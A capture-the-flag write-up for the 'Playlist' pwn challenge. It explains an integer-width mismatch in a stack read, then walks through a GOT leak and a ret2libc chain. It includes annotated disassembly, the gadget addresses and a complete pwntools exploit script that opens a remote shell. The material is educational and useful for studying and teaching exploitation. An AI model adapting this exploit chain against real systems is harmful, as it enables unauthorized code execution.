# Playlist

Category: Pwn  Points: 469  Flag: `nexsec26{integer_overflow_to_ret_2_l1b_goes_brrrrrrrrrrrrrrrrrrrrrrrrrrrrrrr_0c687b07a1429c265813877b480132ae1bae3bcc31b9b77027f1d68276e77687}`  Tools I used: pwntools, objdump, checksec, ROPgadget, gdb, and DeepSeekL: https://chat.deepseek.com/share/j1e2rw7cur3v63gniz

> playlist
> lylera_
>
> "I love make any playlist for this song but i'm pretty sure that this one is safe right?"
> "I guess. Go on, try!"
>
> `nc koala.nexsec.my <PORT>`

The challenge hands you a stripped, dynamically-linked x86-64 binary plus the exact `libc.so.6` (glibc 2.41) and `ld-2.41.so` loader the remote runs. It's a tiny "playlist builder": it asks how many tracks you want to queue, then reads that many track IDs as raw bytes. Nothing to see on the surface — but the length check and the actual read size disagree with each other, and that gap is the whole challenge.

## TL;DR

The binary reads a track count, validates `count * 4` against a max, then `read()`s `count * 4` bytes into a 64-byte stack buffer. The catch is that the two multiplications are computed at **different widths**:

1. The **check** is a 32-bit signed comparison: `shl eax, 2; cmp eax, 0x38; jle`. A count whose `*4` wraps or goes negative in 32 bits sails under the `<= 0x38` gate.
2. The **read size** is a separate 64-bit computation: `cdqe; lea rdx, [rax*4]`. So the size handed to `read()` is `(int64)count * 4`, decoupled from the value that was checked.

Pick a count that is small/negative in the 32-bit check but large (and *valid*) in the 64-bit read, and you get an unbounded stack overflow. No canary and no PIE, so it's a clean ret2libc: leak `puts` through the GOT, re-enter the vulnerable function, then `system("/bin/sh")`.

The two things that actually cost me time were (a) a **negative** count silently failing because `read()` rejects sizes above `SSIZE_MAX`, and (b) trying to split the leak and the shell across **two connections**, which ASLR killed. Both have clean fixes below.

## Step 1 — Reconnaissance

`file` and `checksec` on the binary, plus the libc version:

```
$ file playlist
playlist: ELF 64-bit LSB executable, x86-64, dynamically linked,
          interpreter ./ld-2.41.so, ... stripped

$ checksec --file=playlist
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x3fe000)
RUNPATH:  b'.'

$ strings libc.so.6 | grep "GNU C Library"
GNU C Library (Debian GLIBC 2.41-12+deb13u4) stable release version 2.41.
```

So: **no canary, no PIE**, but **Full RELRO** and **NX**. That combination reads like a recipe card:

- No canary → a stack overflow isn't caught.
- No PIE → code/GOT/PLT live at fixed addresses, so I can hardcode gadgets.
- NX → no shellcode on the stack; I need ROP.
- Full RELRO → the GOT is read-only after startup, so no GOT overwrite. I have to **leak** a libc address and do a classic ret2libc.
- glibc 2.41 → `__free_hook`/`__malloc_hook` are long gone (removed in 2.34), so those aren't options anyway — but I don't need them.

`RUNPATH: b'.'` and the bundled `./ld-2.41.so` just mean I have to run it against the provided loader/libc to match remote:

```
patchelf --set-interpreter ./ld-2.41.so --set-rpath . ./playlist
```

and compute all libc offsets from the **provided** `libc.so.6`, not my system one.

## Step 2 — Finding the bug

The binary is stripped, but the logic is small. Two functions matter: a helper that reads a line and `atoi`s it into an `int`, and the "playlist builder" that uses the result. The builder's disassembly (annotated):

```asm
4012d4:  push rbp
4012d8:  sub  rsp, 0x50
4012dc:  lea  rax, [rip+0xd35]      ; "How many tracks do you want to queue?: "
4012e6:  call printf
4012f0:  lea  rax, [rbp-0x44]
4012f7:  call 40124a                ; read a line, atoi -> [rbp-0x44] (int count)

401300:  mov  eax, [rbp-0x44]       ; eax = count          (32-bit)
401303:  shl  eax, 0x2              ; eax = count * 4       (32-bit, wraps!)
401306:  cmp  eax, 0x38             ; compare with 0x38
401309:  jle  40131c                ; SIGNED compare -> jump if <= 0x38
40130b:  ...  "Playlist too long! Max is 14 tracks." ; else bail

40131c:  lea  rax, [rip+0xd42]      ; "Send track IDs as raw bytes: "
401326:  call printf
401330:  mov  eax, [rbp-0x44]       ; eax = count
401333:  cdqe                       ; SIGN-EXTEND count -> rax (64-bit)
401335:  lea  rdx, [rax*4+0x0]      ; rdx = (int64)count * 4   (64-bit size)
40133d:  lea  rax, [rbp-0x40]       ; buf  (64-byte stack buffer)
401344:  mov  edi, 0x0
401349:  call read                  ; read(0, buf, (int64)count * 4)
40134e:  ...  "Queued."
```

The buffer is at `rbp-0x40` (64 bytes). Saved RBP is at `rbp`, saved RIP at `rbp+8`, so the offset to the return address is `0x40 + 0x8 = 0x48 = 72 bytes`. I confirmed that with a cyclic pattern once I could trigger the overflow.

The vulnerability is the width mismatch:

- `shl eax, 0x2` is a **32-bit** operation and `jle` is a **signed** compare, so the gate only cares about `(int32)(count * 4) <= 0x38`.
- `cdqe; lea rdx, [rax*4]` recomputes the size in **64-bit** from the original count. That is the number of bytes `read()` will actually accept.

Those two numbers do not have to agree. If I choose a count where the 32-bit `count*4` looks `<= 0x38` (including negative) but the 64-bit `count*4` is big, `read()` cheerfully writes far past the 64-byte buffer.

## Step 3 — The "obvious" negative count, and why it silently fails

My first instinct was the laziest value that passes the gate: a negative count. Something like `-0x10000000`:

- `count * 4` in 32 bits = `0xC0000000` → as **signed** that's negative → `<= 0x38` passes.
- `(int64)count * 4` sign-extends to a gigantic `size_t` → "unlimited" overflow, right?

Wrong — and the failure mode is sneaky. The program doesn't crash; it runs completely normally, prints `Queued.` and its goodbye `saved. enjoy!`, and closes. No overflow at all.

The reason is the kernel, not my sending logic. On Linux, `read()` with a `count` greater than `SSIZE_MAX` (`0x7FFFFFFFFFFFFFFF`) fails immediately with `-1` **without touching the buffer**. A negative count sign-extends to something like `0xFFFFFFFFC0000000`, which is way above `SSIZE_MAX`, so `read()` returns `-1`, zero bytes land in the buffer, the saved RIP is untouched, and the function returns normally. I chased a phantom "TCP didn't deliver my payload" theory for a while before realizing the read never even started.

**Takeaway:** a negative count can *never* work here — any `count < 0` makes the 64-bit size exceed `SSIZE_MAX`.

## Step 4 — The real sweet spot: a positive count

So I need a count `N` satisfying all three constraints at once:

```
(int32)(N * 4) <= 0x38      (signed) → passes the gate
(int64)N * 4   <= SSIZE_MAX           → read() actually accepts it
(int64)N * 4   >= 0x48                → big enough to reach saved RIP
```

A **positive** `N` whose low 32 bits of `N*4` land in the negative half (`>= 0x80000000`) threads the needle. The cleanest value:

```
N = 0x20000000  (536870912)
```

- `N * 4 = 0x80000000`. As a signed 32-bit int that's `-2147483648`, which is `<= 0x38` → **gate passes**.
- `(int64)N * 4 = 0x80000000` = 2 GiB, which is **below** `SSIZE_MAX` → `read()` accepts it.
- `read()` on a socket returns as soon as data is available — it does **not** wait for the full 2 GiB — so sending my ~100-byte ROP chain just works. The huge size is only a ceiling.

Swapping the negative count for `0x20000000` was the moment stage 1 started leaking a real libc pointer instead of the goodbye string.

## Step 5 — Leak, re-enter, and the ASLR trap

With Full RELRO I can't overwrite the GOT, but I can still **read** it. Stage 1 chain (no PIE, so these are fixed):

```
[ 72 bytes padding ]
ret                     ; 16-byte stack alignment for the eventual system() call
pop rdi ; ret           ; 0x40119a
puts@got                ; 0x403fb0  -> leak the resolved libc address of puts
puts@plt                ; 0x401030
builder (0x4012d4)      ; return into the vulnerable function for round 2
```

`puts(puts@got)` prints the live address of `puts`, and because I returned straight back into the builder, the **same process** prompts me again for a second overflow.

My first attempt did the shell on a **second `nc` connection**, reusing the leaked base — and it died instantly with EOF, no shell. That's ASLR: libc is re-randomized for every new process, so a base leaked on connection 1 is garbage on connection 2. The fix is to keep everything in **one connection** — leak, re-enter the builder, and send the second chain down the same socket before the process ever exits.

## Step 6 — ret2libc and stack alignment

Once I subtract the known `puts` offset from the leak, I have the libc base, and `system` + `/bin/sh` fall out of the provided `libc.so.6`:

```
puts   offset = 0x802c0
system offset = 0x53090
/bin/sh       = 0x1a5ea4
```

Stage 2 chain, sent on the same connection:

```
[ 72 bytes padding ]
ret                     ; alignment
pop rdi ; ret
&"/bin/sh"              ; libc_base + 0x1a5ea4
system                  ; libc_base + 0x53090
```

The lone `ret` before `pop rdi` matters. glibc 2.41's `system()` runs a `movaps` that **faults unless `rsp` is 16-byte aligned** at the `call`. Without the extra `ret` I got a SIGSEGV deep inside libc; with it, `rsp % 16 == 0` and I dropped straight to a shell. (Rule of thumb when debugging this: a crash *inside* `system`/`movaps` is alignment; a crash at the `ret` into your gadget or at a bogus address is a bad libc base.)

## Step 7 — The exploit script

```python
#!/usr/bin/env python3
from pwn import *

elf  = ELF("./playlist", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

HOST, PORT = "koala.nexsec.my", 1337    # replace 1337 with the port they assign you

POP_RDI = 0x40119a
RET     = 0x40119b
PUTS_PLT = elf.plt["puts"]     # 0x401030
PUTS_GOT = elf.got["puts"]     # 0x403fb0
BUILDER  = 0x4012d4
COUNT    = 0x20000000          # positive sweet spot: passes the 32-bit gate, valid 64-bit read
OFFSET   = 72

def start():
    return remote(HOST, PORT) if args.REMOTE else \
           process(["./ld-2.41.so", "--library-path", ".", "./playlist"])

def send_stage(io, payload):
    io.recvuntil(b"How many tracks do you want to queue?: ")
    io.sendline(str(COUNT).encode())
    io.recvuntil(b"Send track IDs as raw bytes: ")
    io.send(payload)                       # one small send; no shutdown, same connection

io = start()

# --- stage 1: leak puts, return into the builder ---
p1  = b"A" * OFFSET
p1 += p64(RET)
p1 += p64(POP_RDI) + p64(PUTS_GOT) + p64(PUTS_PLT)
p1 += p64(BUILDER)
send_stage(io, p1)

# leak bytes are emitted, then the builder re-prints its first prompt
data = io.recvuntil(b"How many tracks do you want to queue?: ")
leak = u64(data.split(b"\n")[0][:6].ljust(8, b"\x00"))
libc.address = leak - libc.sym["puts"]
log.success(f"puts     = {hex(leak)}")
log.success(f"libc base= {hex(libc.address)}")

# --- stage 2: system("/bin/sh") on the SAME connection ---
system = libc.address + libc.sym["system"]
binsh  = next(libc.search(b"/bin/sh\x00"))
io.sendline(str(COUNT).encode())           # already past the count prompt from the re-entry
io.recvuntil(b"Send track IDs as raw bytes: ")
p2  = b"B" * OFFSET
p2 += p64(RET)
p2 += p64(POP_RDI) + p64(binsh) + p64(system)
io.send(p2)

io.interactive()
```

Run it, then `cat flag.txt`:

```
$ python3 solve.py REMOTE
[+] libc base = 0x7f...000
[*] Switching to interactive mode
$ ls
flag.txt
playlist
$ cat flag.txt
nexsec26{integer_overflow_to_ret_2_l1b_goes_brrr...}
```

## The flag

```
nexsec26{integer_overflow_to_ret_2_l1b_goes_brrrrrrrrrrrrrrrrrrrrrrrrrrrrrrr_0c687b07a1429c265813877b480132ae1bae3bcc31b9b77027f1d68276e77687}
```

The flag text spells out the whole challenge: an **integer overflow** in the size check leading to a **ret2libc**, with the author clearly enjoying the `brrr` of a 2 GiB read that only ever uses 100 bytes of it.

## Mitigations

- **Compute the checked value and the used value the same way.** The entire bug is `shl eax, 2` (32-bit, checked) vs `cdqe; lea rdx, [rax*4]` (64-bit, used). Validate the exact quantity you pass to `read()`, at the same width, after the computation.
- **Treat the count as unsigned and bound it on both ends.** A signed `jle` lets negatives and 32-bit-wrapped values through. Use `size_t`, reject `count > MAX_TRACKS`, and never let a user-controlled value reach a multiplication that can overflow before the check.
- **Don't trust a single comparison to bound a buffer write.** The buffer is 64 bytes; the only thing standing between the input and the saved return address is one arithmetic check. Size the read by the actual buffer capacity (`sizeof buf`), not by a derived count.
- **Standard hardening would have blunted this.** A stack canary would have caught the overwrite, and PIE would have forced an extra leak before any ROP. Both were off here.

## The exploit chain, at a glance

```
32-bit signed size check (shl/cmp/jle)  !=  64-bit read size (cdqe/lea [rax*4])
   -> negative count is a trap: read() rejects size > SSIZE_MAX, writes nothing
   -> positive sweet spot count = 0x20000000: passes the 32-bit gate,
      stays a valid 2 GiB read -> unbounded 72-byte-offset stack overflow
   -> leak puts via puts@got -> puts@plt, then return into the builder (same process)
   -> compute libc base from the provided glibc 2.41
   -> second overflow on the SAME connection (ASLR re-randomizes per connection)
   -> pop rdi; "/bin/sh"; system  (+1 ret for movaps 16-byte alignment) -> shell
```
